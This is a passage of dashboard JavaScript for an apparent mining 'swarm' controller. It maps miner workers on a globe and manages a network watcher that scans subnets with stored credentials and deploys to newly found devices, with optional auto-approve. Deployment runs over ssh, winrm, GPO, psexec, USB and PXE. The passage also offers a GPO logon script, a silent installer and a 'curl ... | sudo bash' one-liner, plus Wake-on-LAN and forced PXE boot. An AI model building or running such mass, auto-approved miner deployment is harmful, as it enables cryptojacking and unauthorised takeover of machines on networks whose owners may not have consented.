      var camera = new THREE.PerspectiveCamera(45, width / height, 0.1, 1000);
      camera.position.z = 3;
      var renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true });
      renderer.setSize(width, height);
      renderer.setPixelRatio(window.devicePixelRatio);
      container.innerHTML = '';
      container.appendChild(renderer.domElement);

      // Globe
      var globeGeo = new THREE.SphereGeometry(1, 48, 48);
      var globeMat = new THREE.MeshBasicMaterial({ color: 0x0a0a2e, wireframe: true, transparent: true, opacity: 0.3 });
      var globe = new THREE.Mesh(globeGeo, globeMat);
      scene.add(globe);

      // Solid dark sphere inside
      var innerGeo = new THREE.SphereGeometry(0.98, 48, 48);
      var innerMat = new THREE.MeshBasicMaterial({ color: 0x050510 });
      scene.add(new THREE.Mesh(innerGeo, innerMat));

      // Midland TX (master): 31.9973, -102.0779
      var masterLatLng = [31.9973, -102.0779];
      var masterPos = _latLngToVec3(masterLatLng[0], masterLatLng[1], 1.02);
      var masterDot = new THREE.Mesh(new THREE.SphereGeometry(0.03, 8, 8), new THREE.MeshBasicMaterial({ color: 0x00ffff }));
      masterDot.position.copy(masterPos);
      scene.add(masterDot);

      // Load workers
      var workerMeshes = [];
      api('GET', 'miner/map').then(function(data) {
        var workers = data.workers || [];
        for (var i = 0; i < workers.length; i++) {
          var w = workers[i];
          if (!w.lat || !w.lng) continue;
          var color = w.status === 'mining+ai' ? 0x00ff00 : w.status === 'mining' ? 0xffff00 : 0xff3333;
          var size = Math.max(0.015, Math.min(0.04, (w.hashrate || 100) / 5000));
          var pos = _latLngToVec3(w.lat, w.lng, 1.02);
          var dot = new THREE.Mesh(new THREE.SphereGeometry(size, 8, 8), new THREE.MeshBasicMaterial({ color: color }));
          dot.position.copy(pos);
          scene.add(dot);

          // Connection line to master
          var lineGeo = new THREE.BufferGeometry().setFromPoints([masterPos, pos]);
          var lineMat = new THREE.LineBasicMaterial({ color: color, transparent: true, opacity: 0.3 });
          scene.add(new THREE.Line(lineGeo, lineMat));
          workerMeshes.push(dot);
        }
      }).catch(function() {});

      // Animate
      function animate() {
        requestAnimationFrame(animate);
        globe.rotation.y += 0.002;
        for (var i = 0; i < workerMeshes.length; i++) {
          // Slight pulse
          var s = 1 + 0.1 * Math.sin(Date.now() * 0.003 + i);
          workerMeshes[i].scale.set(s, s, s);
        }
        renderer.render(scene, camera);
      }
      animate();

      // Handle resize
      window.addEventListener('resize', function() {
        var w = container.clientWidth || 400;
        camera.aspect = w / height;
        camera.updateProjectionMatrix();
        renderer.setSize(w, height);
      });
    }

    function _latLngToVec3(lat, lng, radius) {
      var phi = (90 - lat) * (Math.PI / 180);
      var theta = (lng + 180) * (Math.PI / 180);
      return new THREE.Vector3(
        -(radius * Math.sin(phi) * Math.cos(theta)),
        radius * Math.cos(phi),
        radius * Math.sin(phi) * Math.sin(theta)
      );
    }

    // Initialize globe when swarm panel is shown
    var _origSwitchPanel = switchPanel;
    switchPanel = function(name) {
      _origSwitchPanel(name);
      if (name === 'swarm') initSwarmGlobe();
    };

    // ── Network Watcher Panel ──
    function loadNetworkWatcher() {
      var el = document.getElementById('networkWatcherContent');
      if (!el) return;
      el.innerHTML = '<p style="color:var(--dim)">Loading...</p>';
      Promise.all([
        api('GET', 'watcher/status').catch(function() { return { watching: false, autoApprove: false, sites: 0, pending: 0, deployed: 0, failed: 0, total: 0 }; }),
        api('GET', 'watcher/pending').catch(function() { return { pending: [] }; }),
        api('GET', 'watcher/deployed').catch(function() { return { deployed: [] }; }),
        api('GET', 'watcher/sites').catch(function() { return { sites: {} }; })
      ]).then(function(r) {
        var st = r[0], pending = r[1].pending || [], deployed = r[2].deployed || [], sites = r[3].sites || {};
        var siteNames = Object.keys(sites);
        var intg = st.integrations || {};
        var html = '';

        // Method badge helper
        var methodBadge = function(m) {
          var colors = { ssh: '#22c55e', winrm: '#3b82f6', gpo: '#8b5cf6', ad: '#f59e0b', ansible: '#06b6d4', pxe: '#ec4899', usb: '#f97316', psexec: '#ef4444', 'network-deployer': '#22c55e' };
          var c = colors[m] || 'var(--dim)';
          return '<span style="background:' + c + ';color:#000;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:600">' + (m || 'unknown').toUpperCase() + '</span>';
        };

        // Status bar
        html += '<div class="info-card" style="margin-bottom:16px"><h3>&#x1F4E1; Network Watcher - Central Orchestrator</h3>';
        html += '<div style="display:grid;grid-template-columns:repeat(6,1fr);gap:12px;margin:12px 0">';
        html += '<div><div style="font-size:20px;' + (st.watching ? 'color:var(--green)' : 'color:var(--dim)') + '">' + (st.watching ? '&#x25CF; ON' : '&#x25CB; OFF') + '</div><div style="font-size:11px;color:var(--dim)">Watching</div></div>';
        html += '<div><div style="font-size:20px;' + (st.autoApprove ? 'color:var(--accent)' : 'color:var(--dim)') + '">' + (st.autoApprove ? 'AUTO' : 'MANUAL') + '</div><div style="font-size:11px;color:var(--dim)">Approve Mode</div></div>';
        html += '<div><div style="font-size:20px;color:var(--accent)">' + st.sites + '</div><div style="font-size:11px;color:var(--dim)">Sites</div></div>';
        html += '<div><div style="font-size:20px;color:var(--yellow)">' + st.pending + '</div><div style="font-size:11px;color:var(--dim)">Pending</div></div>';
        html += '<div><div style="font-size:20px;color:var(--green)">' + st.deployed + '</div><div style="font-size:11px;color:var(--dim)">Deployed</div></div>';
        html += '<div><div style="font-size:20px;color:var(--red)">' + st.failed + '</div><div style="font-size:11px;color:var(--dim)">Failed</div></div>';
        html += '</div>';
        // Integration status
        html += '<div style="margin:8px 0;display:flex;flex-wrap:wrap;gap:6px;font-size:11px">';
        var intLabels = [['networkDeployer','Network Deployer'],['wifiScanner','WiFi Scanner'],['adDeployer','AD Deployer'],['fleetDeployer','Fleet/Ansible'],['pxeServer','PXE Server'],['telegramBot','Telegram Bot'],['ansible','Ansible CLI']];
        for (var il = 0; il < intLabels.length; il++) {
          var ik = intLabels[il][0], iLabel = intLabels[il][1], iOn = intg[ik];
          html += '<span style="padding:3px 8px;border-radius:10px;background:' + (iOn ? 'rgba(34,197,94,0.2);color:var(--green)' : 'rgba(255,255,255,0.05);color:var(--dim)') + '">' + (iOn ? '&#x25CF;' : '&#x25CB;') + ' ' + iLabel + '</span>';
        }
        html += '</div>';
        html += '<div style="display:flex;gap:8px;margin:12px 0">';
        html += '<button class="btn-primary" onclick="window.aries.watcherToggle(' + !st.watching + ')">' + (st.watching ? '&#x23F9; Stop Watching' : '&#x25B6; Start Watching') + '</button>';
        html += '<button class="btn-sm" onclick="window.aries.watcherAutoApprove(' + !st.autoApprove + ')">' + (st.autoApprove ? '&#x1F512; Switch to Manual' : '&#x1F513; Enable Auto-Approve') + '</button>';
        html += '<button class="btn-sm" onclick="window.aries.loadNetworkWatcher()">&#x1F504; Refresh</button>';
        html += '</div></div>';

        // Add Site form
        html += '<div class="info-card" style="margin-bottom:16px"><h3>&#x1F3ED; Sites</h3>';
        html += '<div style="display:flex;gap:8px;margin:8px 0;flex-wrap:wrap">';
        html += '<input id="watcherSiteName" class="input-field" style="width:140px" placeholder="Site name" />';
        html += '<input id="watcherSiteSubnet" class="input-field" style="width:140px" placeholder="Subnet (192.168.1)" />';
        html += '<input id="watcherSiteUser" class="input-field" style="width:120px" placeholder="User" />';
        html += '<input id="watcherSitePass" class="input-field" style="width:120px" placeholder="Password" type="password" />';
        html += '<button class="btn-sm" onclick="window.aries.watcherAddSite()">+ Add Site</button>';
        html += '</div>';
        if (siteNames.length) {
          html += '<table style="width:100%;font-size:13px"><tr style="color:var(--dim)"><th>Name</th><th>Subnet</th><th>User</th></tr>';
          for (var i = 0; i < siteNames.length; i++) {
            var s = sites[siteNames[i]];
            html += '<tr><td>' + siteNames[i] + '</td><td><code>' + s.subnet + '</code></td><td>' + ((s.credentials && s.credentials.user) || '-') + '</td></tr>';
          }
          html += '</table>';
        } else {
          html += '<p style="color:var(--dim);font-size:13px">No sites configured. Add a site to start monitoring subnets.</p>';
        }
        html += '</div>';

        // Pending devices
        html += '<div class="info-card" style="margin-bottom:16px"><h3>&#x23F3; Pending Devices (' + pending.length + ')</h3>';
        if (pending.length) {
          html += '<div style="margin-bottom:8px"><button class="btn-sm" onclick="window.aries.watcherApproveAll()">✅ Approve All (' + pending.length + ')</button></div>';
          html += '<table style="width:100%;font-size:13px"><tr style="color:var(--dim)"><th>IP</th><th>MAC</th><th>Site</th><th>First Seen</th><th>Actions</th></tr>';
          for (var p = 0; p < pending.length; p++) {
            var d = pending[p];
            html += '<tr><td><code>' + d.ip + '</code></td><td><code>' + d.mac + '</code></td><td>' + (d.site || '-') + '</td><td>' + new Date(d.firstSeen).toLocaleString() + '</td>';
            html += '<td><button class="btn-sm" onclick="window.aries.watcherApprove(\'' + d.ip + '\')">✅</button> <button class="btn-sm" style="background:var(--red)" onclick="window.aries.watcherReject(\'' + d.ip + '\')">❌</button></td></tr>';
          }
          html += '</table>';
        } else {
          html += '<p style="color:var(--dim);font-size:13px">No pending devices.</p>';
        }
        html += '</div>';

        // Deployed devices
        html += '<div class="info-card" style="margin-bottom:16px"><h3>&#x2705; Deployed Devices (' + deployed.length + ')</h3>';
        if (deployed.length) {
          html += '<table style="width:100%;font-size:13px"><tr style="color:var(--dim)"><th>IP</th><th>MAC</th><th>Site</th><th>Method</th><th>Deployed At</th></tr>';
          for (var dd = 0; dd < deployed.length; dd++) {
            var dv = deployed[dd];
            html += '<tr><td><code>' + dv.ip + '</code></td><td><code>' + dv.mac + '</code></td><td>' + (dv.site || '-') + '</td><td>' + methodBadge(dv.deployMethod) + '</td><td>' + (dv.deployTime ? new Date(dv.deployTime).toLocaleString() : '-') + '</td></tr>';
          }
          html += '</table>';
        } else {
          html += '<p style="color:var(--dim);font-size:13px">No deployed devices yet.</p>';
        }
        html += '</div>';

        el.innerHTML = html;
      });
    }

    function watcherToggle(start) {
      api('POST', start ? 'watcher/start' : 'watcher/stop').then(function() {
        toast(start ? 'Watcher started' : 'Watcher stopped', 'success');
        _loadedPanels['network-watcher'] = false;
        loadNetworkWatcher();
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function watcherAutoApprove(enabled) {
      api('POST', 'watcher/auto-approve', { enabled: enabled }).then(function() {
        toast('Auto-approve ' + (enabled ? 'enabled' : 'disabled'), 'success');
        _loadedPanels['network-watcher'] = false;
        loadNetworkWatcher();
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function watcherAddSite() {
      var name = document.getElementById('watcherSiteName').value;
      var subnet = document.getElementById('watcherSiteSubnet').value;
      var user = document.getElementById('watcherSiteUser').value;
      var pass = document.getElementById('watcherSitePass').value;
      if (!name || !subnet) return toast('Name and subnet required', 'error');
      api('POST', 'watcher/site', { name: name, subnet: subnet, credentials: { user: user, pass: pass } }).then(function() {
        toast('Site added: ' + name, 'success');
        _loadedPanels['network-watcher'] = false;
        loadNetworkWatcher();
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function watcherApprove(ip) {
      api('POST', 'watcher/approve', { ip: ip }).then(function() {
        toast('Approved: ' + ip, 'success');
        _loadedPanels['network-watcher'] = false;
        loadNetworkWatcher();
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function watcherApproveAll() {
      api('POST', 'watcher/approve', { all: true }).then(function(r) {
        toast('Approved ' + (r.approved || 0) + ' devices', 'success');
        _loadedPanels['network-watcher'] = false;
        loadNetworkWatcher();
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function watcherReject(ip) {
      api('POST', 'watcher/reject', { ip: ip }).then(function() {
        toast('Rejected: ' + ip, 'success');
        _loadedPanels['network-watcher'] = false;
        loadNetworkWatcher();
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    // ── Deploy Learner Panel ──
    function loadDeployLearner() {
      var el = document.getElementById('deployLearnerContent');
      if (!el) return;
      el.innerHTML = '<div class="spinner"></div> Loading deploy learner...';
      Promise.all([
        api('GET', 'deploy-learner/stats').catch(function() { return {}; }),
        api('GET', 'deploy-learner/failures').catch(function() { return { failures: [] }; }),
        api('GET', 'deploy-learner/log?limit=50').catch(function() { return { log: [] }; })
      ]).then(function(results) {
        var stats = results[0], failures = results[1].failures || [], log = results[2].log || [];
        var sr = ((stats.successRate || 0) * 100).toFixed(1);
        var topErr = (stats.topErrors && stats.topErrors[0]) ? stats.topErrors[0].error : 'none';
        var html = '';
        // Stats cards
        html += '<div class="stat-row">';
        html += '<div class="stat-card"><div class="stat-card-val" style="color:var(--green)">' + sr + '%</div><div class="stat-card-label">Success Rate</div></div>';
        html += '<div class="stat-card"><div class="stat-card-val">' + (stats.totalAttempts || 0) + '</div><div class="stat-card-label">Total Deploys</div></div>';
        html += '<div class="stat-card"><div class="stat-card-val">' + (stats.avgRetries || 0).toFixed(1) + '</div><div class="stat-card-label">Avg Retries</div></div>';
        html += '<div class="stat-card"><div class="stat-card-val" style="color:var(--red)">' + escapeHtml(topErr) + '</div><div class="stat-card-label">Top Error</div></div>';
        html += '<div class="stat-card"><div class="stat-card-val">' + (stats.strategiesLearned || 0) + '</div><div class="stat-card-label">Strategies</div></div>';
        html += '<div class="stat-card"><div class="stat-card-val">' + (stats.pendingRetries || 0) + '</div><div class="stat-card-label">Pending Retries</div></div>';
        html += '</div>';
        // Retry button
        html += '<div style="margin:12px 0"><button class="btn-primary" onclick="window.aries.deployLearnerRetryAll()">&#x1F504; Retry All Failed</button>';
        html += ' <button class="btn-sm" onclick="window.aries.loadDeployLearner()">&#x1F504; Refresh</button></div>';
        // Failure breakdown
        html += '<div class="card" style="margin:12px 0"><h3 style="margin:0 0 8px;color:var(--accent)">&#x26A0; Failure Breakdown</h3>';
        if (failures.length === 0) {
          html += '<div style="color:var(--text-dim);font-size:13px">No failures recorded yet.</div>';
        } else {
          html += '<table class="data-table"><tr><th>Error Type</th><th>Count</th><th>Devices</th><th>Last Seen</th><th>Suggestion</th></tr>';
          for (var i = 0; i < failures.length; i++) {
            var f = failures[i];
            html += '<tr><td><code>' + escapeHtml(f.errorType) + '</code></td>';
            html += '<td>' + f.count + '</td>';
            html += '<td>' + f.uniqueDevices + '</td>';
            html += '<td>' + (f.lastSeen ? new Date(f.lastSeen).toLocaleString() : '-') + '</td>';
            html += '<td style="font-size:11px;max-width:200px">' + escapeHtml(f.suggestion || '') + '</td></tr>';
          }
          html += '</table>';
        }
        html += '</div>';
        // Site success rates
        var sites = stats.siteBreakdown || {};
        var siteKeys = Object.keys(sites);
        if (siteKeys.length > 0) {
          html += '<div class="card" style="margin:12px 0"><h3 style="margin:0 0 8px;color:var(--accent2)">&#x1F3E2; Site Success Rates</h3>';
          html += '<table class="data-table"><tr><th>Site</th><th>Success Rate</th><th>Total</th><th>Method</th><th>Needs Creds</th></tr>';
          for (var s = 0; s < siteKeys.length; s++) {
            var si = sites[siteKeys[s]];
            html += '<tr><td>' + escapeHtml(siteKeys[s]) + '</td>';
            html += '<td>' + ((si.successRate || 0) * 100).toFixed(1) + '%</td>';
            html += '<td>' + (si.total || 0) + '</td>';
            html += '<td>' + escapeHtml(si.preferredMethod || 'auto') + '</td>';
            html += '<td>' + (si.needsCredentials ? '<span style="color:var(--red)">YES</span>' : 'No') + '</td></tr>';
          }
          html += '</table></div>';
        }
        // Strategy lookup
        html += '<div class="card" style="margin:12px 0"><h3 style="margin:0 0 8px;color:var(--accent)">&#x1F50D; Strategy Lookup</h3>';
        html += '<div style="display:flex;gap:8px;align-items:center">';
        html += '<input id="dlStrategyIp" placeholder="IP address" style="flex:1;padding:6px;background:var(--bg2);border:1px solid var(--border);color:var(--text);border-radius:4px">';
        html += '<button class="btn-sm" onclick="window.aries.deployLearnerStrategy()">Lookup</button></div>';
        html += '<div id="dlStrategyResult" style="margin-top:8px;font-size:12px;color:var(--text-dim)"></div></div>';
        // Deploy log
        html += '<div class="card" style="margin:12px 0"><h3 style="margin:0 0 8px;color:var(--accent2)">&#x1F4CB; Recent Deploy Log</h3>';
        if (log.length === 0) {
          html += '<div style="color:var(--text-dim);font-size:13px">No deployments logged yet.</div>';
        } else {
          html += '<div style="max-height:300px;overflow-y:auto"><table class="data-table"><tr><th>Time</th><th>IP</th><th>Method</th><th>Error</th><th>Resolution</th><th>Status</th></tr>';
          for (var l = 0; l < log.length; l++) {
            var entry = log[l];
            var statusColor = entry.success ? 'var(--green)' : 'var(--red)';
            html += '<tr><td style="font-size:11px">' + (entry.time ? new Date(entry.time).toLocaleString() : '-') + '</td>';
            html += '<td><code>' + escapeHtml(entry.ip || '') + '</code></td>';
            html += '<td>' + escapeHtml(entry.method || '') + '</td>';
            html += '<td>' + escapeHtml(entry.error || '-') + '</td>';
            html += '<td style="font-size:11px">' + escapeHtml(entry.resolution || '-') + '</td>';
            html += '<td><span style="color:' + statusColor + '">&#x25CF;</span> ' + (entry.success ? 'OK' : 'FAIL') + '</td></tr>';
          }
          html += '</table></div>';
        }
        html += '</div>';
        el.innerHTML = html;
      }).catch(function(e) {
        el.innerHTML = '<div style="color:var(--red)">Failed to load: ' + escapeHtml(e.message) + '</div>';
      });
    }

    function deployLearnerRetryAll() {
      api('POST', 'deploy-learner/retry').then(function() {
        toast('Retry queued for all failed deployments', 'success');
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function deployLearnerStrategy() {
      var ip = document.getElementById('dlStrategyIp');
      if (!ip || !ip.value) return;
      api('GET', 'deploy-learner/strategy/' + encodeURIComponent(ip.value)).then(function(data) {
        var el = document.getElementById('dlStrategyResult');
        if (!el) return;
        el.innerHTML = '<strong>Method:</strong> ' + escapeHtml(data.method || 'ssh') +
          ' | <strong>Confidence:</strong> ' + ((data.confidence || 0) * 100).toFixed(0) + '%' +
          ' | <strong>Source:</strong> ' + escapeHtml(data.source || 'default');
      }).catch(function(e) {
        var el = document.getElementById('dlStrategyResult');
        if (el) el.innerHTML = '<span style="color:var(--red)">Error: ' + escapeHtml(e.message) + '</span>';
      });
    }

    // ── Mass Deploy Panel ──
    function loadMassDeploy() {
      var el = document.getElementById('massDeployContent');
      if (!el) return;
      var relayUrl = location.origin;
      var html = '';

      // Login Script card
      html += '<div class="info-card" style="margin-bottom:16px">';
      html += '<h3>&#x1F4DD; Windows Login Script</h3>';
      html += '<p style="color:var(--dim);font-size:12px;margin:8px 0">Domain login script - runs at every user login via GPO. Place in \\\\DC\\NETLOGON share.</p>';
      html += '<div style="display:flex;gap:8px;flex-wrap:wrap">';
      html += '<a href="/api/deploy/login-script" class="btn-primary" style="text-decoration:none" download>&#x2B07; Download .bat</a>';
      html += '<button class="btn-sm" onclick="window.aries.copyMassDeployCmd(\'login\')">&#x1F4CB; Copy NETLOGON Path</button>';
      html += '</div>';
      html += '<div style="margin-top:8px;font-size:11px;color:var(--dim)">';
      html += '<strong>Setup:</strong> GPO &rarr; User Config &rarr; Policies &rarr; Windows Settings &rarr; Scripts &rarr; Logon &rarr; Add login-deploy.bat';
      html += '</div></div>';

      // MSI/NSIS Installer card
      html += '<div class="info-card" style="margin-bottom:16px">';
      html += '<h3>&#x1F4E6; Windows Installer (NSIS)</h3>';
      html += '<p style="color:var(--dim);font-size:12px;margin:8px 0">Silent installer for GPO software distribution, SCCM, Intune, or manual install.</p>';
      html += '<div style="display:flex;gap:8px;flex-wrap:wrap">';
      html += '<a href="/api/deploy/installer" class="btn-primary" style="text-decoration:none" download>&#x2B07; Download Installer</a>';
      html += '<button class="btn-sm" onclick="window.aries.buildMassInstaller()">&#x1F528; Build Installer</button>';
      html += '</div>';
      html += '<div id="massDeployBuildResult" style="margin-top:8px;font-size:11px"></div>';
      html += '<div style="margin-top:8px;font-size:11px;color:var(--dim)">';
      html += '<strong>Silent install:</strong> <code>aries-worker-setup.exe /S</code>';
      html += '</div></div>';

      // Raspberry Pi card
      html += '<div class="info-card" style="margin-bottom:16px">';
      html += '<h3>&#x1F353; Raspberry Pi (ARM)</h3>';
      html += '<p style="color:var(--dim);font-size:12px;margin:8px 0">One-liner setup for Pi Zero, Pi 3, Pi 4, Pi 5. Auto-detects ARM architecture.</p>';
      html += '<div style="display:flex;gap:8px;flex-wrap:wrap">';
      html += '<a href="/api/deploy/rpi-script" class="btn-primary" style="text-decoration:none" download>&#x2B07; Download Script</a>';
      html += '<button class="btn-sm" onclick="window.aries.copyMassDeployCmd(\'rpi\')">&#x1F4CB; Copy One-Liner</button>';
      html += '</div>';
      html += '<div style="margin-top:8px;padding:8px;background:var(--bg);border-radius:4px;font-family:monospace;font-size:11px;word-break:break-all">';
      html += 'curl -sL ' + escapeHtml(relayUrl) + '/api/deploy/rpi-script | sudo bash';
      html += '</div></div>';

      el.innerHTML = html;
    }

    function copyMassDeployCmd(type) {
      var relayUrl = location.origin;
      var text = '';
      if (type === 'login') text = '\\\\%LOGONSERVER%\\NETLOGON\\login-deploy.bat';
      else if (type === 'rpi') text = 'curl -sL ' + relayUrl + '/api/deploy/rpi-script | sudo bash';
      if (navigator.clipboard) {
        navigator.clipboard.writeText(text).then(function() { toast('Copied!', 'success'); });
      }
    }

    function buildMassInstaller() {
      var el = document.getElementById('massDeployBuildResult');
      if (el) el.innerHTML = '<span style="color:var(--accent)">Building...</span>';
      api('POST', 'deploy/build-installer').then(function(r) {
        if (r.success) {
          if (el) el.innerHTML = '<span style="color:var(--green)">&#x2705; Built! ' + escapeHtml(r.size || '') + '</span>';
        } else {
          if (el) el.innerHTML = '<span style="color:var(--yellow)">&#x26A0; Bundle ready, NSIS needed: ' + escapeHtml(r.error || '') + '</span>';
        }
      }).catch(function(e) {
        if (el) el.innerHTML = '<span style="color:var(--red)">Error: ' + escapeHtml(e.message) + '</span>';
      });
    }

    // ── WoL Manager Panel ──
    function loadWolManager() {
      var el = document.getElementById('wolManagerContent');
      if (!el) return;
      el.innerHTML = '<p style="color:var(--dim)">Loading...</p>';
      Promise.all([
        api('GET', 'wol/health').catch(function() { return { health: {}, watchdogEnabled: false }; }),
        api('GET', 'wol/devices').catch(function() { return { devices: [] }; })
      ]).then(function(results) {
        var hData = results[0], devData = results[1];
        var health = hData.health || {};
        var watchdogOn = hData.watchdogEnabled || false;
        var devices = devData.devices || [];
        var html = '';

        // Stats cards
        var online = 0, silent = 0, dead = 0, wolPending = 0, total = 0;
        var hKeys = Object.keys(health);
        for (var hi = 0; hi < hKeys.length; hi++) {
          var h = health[hKeys[hi]];
          total++;
          if (h.status === 'online') online++;
          else if (h.status === 'silent') silent++;
          else if (h.status === 'dead') dead++;
          else if (h.status === 'wol-pending') wolPending++;
        }

        html += '<div style="display:grid;grid-template-columns:repeat(5,1fr);gap:12px;margin-bottom:16px">';
        html += '<div class="info-card"><div style="font-size:24px;color:var(--accent)">' + total + '</div><div style="font-size:11px;color:var(--dim)">Total Devices</div></div>';
        html += '<div class="info-card"><div style="font-size:24px;color:var(--green)">' + online + '</div><div style="font-size:11px;color:var(--dim)">Online</div></div>';
        html += '<div class="info-card"><div style="font-size:24px;color:var(--yellow,#f0ad4e)">' + silent + '</div><div style="font-size:11px;color:var(--dim)">Silent</div></div>';
        html += '<div class="info-card"><div style="font-size:24px;color:orange">' + wolPending + '</div><div style="font-size:11px;color:var(--dim)">WoL Pending</div></div>';
        html += '<div class="info-card"><div style="font-size:24px;color:var(--red)">' + dead + '</div><div style="font-size:11px;color:var(--dim)">Dead</div></div>';
        html += '</div>';

        // Controls
        html += '<div class="info-card" style="margin-bottom:16px"><h3>&#x2699;&#xFE0F; Controls</h3>';
        html += '<div style="display:flex;gap:8px;flex-wrap:wrap;margin:12px 0">';
        html += '<button class="btn-primary" onclick="window.aries.wolWakeAll()">&#x26A1; Wake All</button>';
        html += '<button class="btn-sm" onclick="window.aries.wolPxeForceAll()">&#x1F4E1; PXE Force All</button>';
        html += '<label style="display:flex;align-items:center;gap:6px;cursor:pointer"><input type="checkbox" id="wolWatchdogToggle" ' + (watchdogOn ? 'checked' : '') + ' onchange="window.aries.wolToggleWatchdog(this.checked)" /> Watchdog</label>';
        html += '</div>';
        // Wake by site
        html += '<div style="display:flex;gap:8px;margin-top:8px"><input id="wolSiteInput" class="input-field" style="flex:1" placeholder="Site name..." />';
        html += '<button class="btn-sm" onclick="window.aries.wolWakeSite()">Wake Site</button>';
        html += '<button class="btn-sm" onclick="window.aries.wolPxeForceSite()">PXE Site</button></div>';
        // Add device
        html += '<div style="display:flex;gap:8px;margin-top:8px"><input id="wolAddMac" class="input-field" style="width:160px" placeholder="MAC address" />';
        html += '<input id="wolAddIp" class="input-field" style="width:120px" placeholder="IP" />';
        html += '<input id="wolAddHost" class="input-field" style="width:120px" placeholder="Hostname" />';
        html += '<input id="wolAddSite" class="input-field" style="width:100px" placeholder="Site" />';
        html += '<button class="btn-sm" onclick="window.aries.wolAddDevice()">+ Add</button></div>';
        html += '</div>';

        // Health grid
        html += '<div class="info-card"><h3>&#x1F4CA; Worker Health</h3>';
        if (hKeys.length === 0 && devices.length === 0) {
          html += '<p style="color:var(--dim)">No devices registered. Add devices above or let the watchdog discover them.</p>';
        } else {
          html += '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:8px;margin-top:12px">';
          var allMacs = {};
          for (var di = 0; di < devices.length; di++) allMacs[devices[di].mac] = devices[di];
          for (var hj = 0; hj < hKeys.length; hj++) if (!allMacs[hKeys[hj]]) allMacs[hKeys[hj]] = health[hKeys[hj]];
          var macList = Object.keys(allMacs);
          for (var mi = 0; mi < macList.length; mi++) {
            var mac = macList[mi];
            var dev = allMacs[mac] || {};
            var hs = health[mac] || {};
            var status = hs.status || 'unknown';
            var statusColor = status === 'online' ? 'var(--green)' : status === 'silent' ? '#f0ad4e' : status === 'wol-pending' ? 'orange' : status === 'dead' ? 'var(--red)' : 'var(--dim)';
            var statusIcon = status === 'online' ? '&#x1F7E2;' : status === 'silent' ? '&#x1F7E1;' : status === 'dead' ? '&#x1F534;' : '&#x1F7E0;';
            var lastSeen = hs.lastSeen || dev.lastSeen;
            var ago = lastSeen ? Math.round((Date.now() - lastSeen) / 60000) + 'm ago' : 'never';
            html += '<div style="background:var(--bg2);border-radius:8px;padding:10px;border-left:3px solid ' + statusColor + '">';
            html += '<div style="display:flex;justify-content:space-between;align-items:center">';
            html += '<div>' + statusIcon + ' <strong>' + escapeHtml(dev.hostname || dev.workerId || mac) + '</strong></div>';
            html += '<span style="font-size:10px;color:' + statusColor + ';text-transform:uppercase">' + status + '</span></div>';
            html += '<div style="font-size:11px;color:var(--dim);margin:4px 0">MAC: ' + escapeHtml(mac) + (dev.ip ? ' | IP: ' + escapeHtml(dev.ip) : '') + (dev.site ? ' | Site: ' + escapeHtml(dev.site) : '') + '</div>';
            html += '<div style="font-size:11px;color:var(--dim)">Last seen: ' + ago + (hs.wolAttempts ? ' | WoL: ' + hs.wolAttempts + '/3' : '') + '</div>';
            html += '<div style="margin-top:6px;display:flex;gap:4px">';
            html += '<button class="btn-sm" style="font-size:10px;padding:2px 8px" onclick="window.aries.wolWakeOne(\'' + escapeHtml(mac) + '\',\'' + escapeHtml(dev.ip || '') + '\')">Wake</button>';
            if (dev.ip) html += '<button class="btn-sm" style="font-size:10px;padding:2px 8px" onclick="window.aries.wolPxeForce(\'' + escapeHtml(dev.ip) + '\')">PXE</button>';
            html += '</div></div>';
          }
          html += '</div>';
        }
        html += '</div>';

        el.innerHTML = html;
      });
    }

    function wolWakeAll() { api('POST', 'wol/wake', {}).then(function() { toast('WoL sent to all devices', 'success'); setTimeout(loadWolManager, 2000); }).catch(function(e) { toast('Error: ' + e.message, 'error'); }); }
    function wolWakeSite() { var s = document.getElementById('wolSiteInput'); if (!s || !s.value) return toast('Enter site name', 'error'); api('POST', 'wol/wake', { site: s.value }).then(function() { toast('WoL sent to site ' + s.value, 'success'); setTimeout(loadWolManager, 2000); }).catch(function(e) { toast('Error: ' + e.message, 'error'); }); }
    function wolWakeOne(mac, ip) { api('POST', 'wol/wake', { mac: mac, ip: ip || undefined }).then(function() { toast('WoL sent to ' + mac, 'success'); }).catch(function(e) { toast('Error: ' + e.message, 'error'); }); }
    function wolToggleWatchdog(on) { api('POST', 'wol/watchdog', { enabled: on }).then(function(r) { toast('Watchdog ' + (r.watchdogEnabled ? 'enabled' : 'disabled'), 'success'); }).catch(function(e) { toast('Error: ' + e.message, 'error'); }); }
    function wolPxeForceAll() { api('POST', 'wol/pxe-force', {}).then(function() { toast('PXE boot set on all devices', 'success'); }).catch(function(e) { toast('Error: ' + e.message, 'error'); }); }
    function wolPxeForceSite() { var s = document.getElementById('wolSiteInput'); if (!s || !s.value) return toast('Enter site name', 'error'); api('POST', 'wol/pxe-force', { site: s.value }).then(function() { toast('PXE boot set for site ' + s.value, 'success'); }).catch(function(e) { toast('Error: ' + e.message, 'error'); }); }
    function wolPxeForce(ip) { api('POST', 'wol/pxe-force', { ip: ip }).then(function() { toast('PXE boot set for ' + ip, 'success'); }).catch(function(e) { toast('Error: ' + e.message, 'error'); }); }
    function wolAddDevice() {
      var mac = document.getElementById('wolAddMac'), ip = document.getElementById('wolAddIp'), host = document.getElementById('wolAddHost'), site = document.getElementById('wolAddSite');
      if (!mac || !mac.value) return toast('MAC address required', 'error');
      api('POST', 'wol/device', { mac: mac.value, ip: (ip && ip.value) || undefined, hostname: (host && host.value) || undefined, site: (site && site.value) || undefined })
        .then(function() { toast('Device added', 'success'); loadWolManager(); })
        .catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    // ── Link Deploy Panel ──
    function loadLinkDeploy() {
      var el = document.getElementById('panel-link-deploy');
      if (!el) return;
      el.innerHTML = '<div class="spinner"></div> Loading...';
      api('GET', 'links/list').then(function(data) {
        var links = data.links || [];
        var html = '<h2 style="color:var(--accent);margin-bottom:16px">&#x1F517; Link Deploy</h2>';
